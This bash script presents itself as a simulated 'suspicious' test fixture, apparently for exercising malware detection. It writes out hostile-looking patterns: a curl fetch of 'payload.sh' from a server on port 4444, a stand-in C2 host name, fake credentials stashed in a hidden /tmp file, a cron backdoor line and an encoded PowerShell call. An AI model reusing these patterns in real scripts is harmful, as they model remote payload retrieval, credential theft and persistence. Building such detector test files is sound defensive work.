#!/bin/bash
# Simulated "suspicious" script for testing purposes
# This is a SAFE test file - not actual malware

echo "Connecting to server..."
SERVER="192.168.100.50"
BACKUP_SERVER="malicious-c2.example.com"
PORT=4444

# Simulated suspicious behavior patterns
curl http://$SERVER:$PORT/payload.sh 2>/dev/null || echo "Connection failed"

# Simulated credential harvesting (fake)
echo "admin:password123" > /tmp/.credentials
echo "root:secretpass" >> /tmp/.credentials

# Simulated persistence mechanism (fake)
echo "* * * * * /tmp/.backdoor.sh" >> /tmp/fake_crontab

# Base64 encoded string (common in malware)
PAYLOAD="ZWNobyAiVGhpcyBpcyBhIHRlc3QgcGF5bG9hZCI="

# PowerShell-like command (suspicious pattern)
# powershell -enc $PAYLOAD

echo "Setup complete"
